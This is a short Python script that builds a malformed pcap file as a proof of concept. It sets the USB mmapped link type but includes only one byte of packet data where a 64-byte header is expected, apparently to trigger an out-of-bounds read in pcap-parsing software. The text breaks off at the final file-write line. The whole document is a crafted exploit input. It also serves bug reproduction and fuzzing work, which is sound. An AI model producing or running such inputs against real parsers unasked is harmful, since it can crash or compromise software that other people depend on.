import struct

# pcap global header
magic = 0xa1b2c3d4  # little-endian magic
version_major = 2
version_minor = 4
thiszone = 0
sigfigs = 0
snaplen = 65535
network = 220  # DLT_USB_LINUX_MMAPPED

global_hdr = struct.pack('<IHHiIII', magic, version_major, version_minor, thiszone, sigfigs, snaplen, network)

# packet header - caplen = 1 byte (much less than 64 bytes needed for pcap_usb_header_mmapped)
ts_sec = 0
ts_usec = 0
incl_len = 1  # only 1 byte of packet data
orig_len = 1

pkt_hdr = struct.pack('<IIII', ts_sec, ts_usec, incl_len, orig_len)

# packet data - just 1 byte
pkt_data = b'\x00'

poc = global_hdr + pkt_hdr + pkt_data

with open('/workspace/poc.pcap', 'wb') as f:
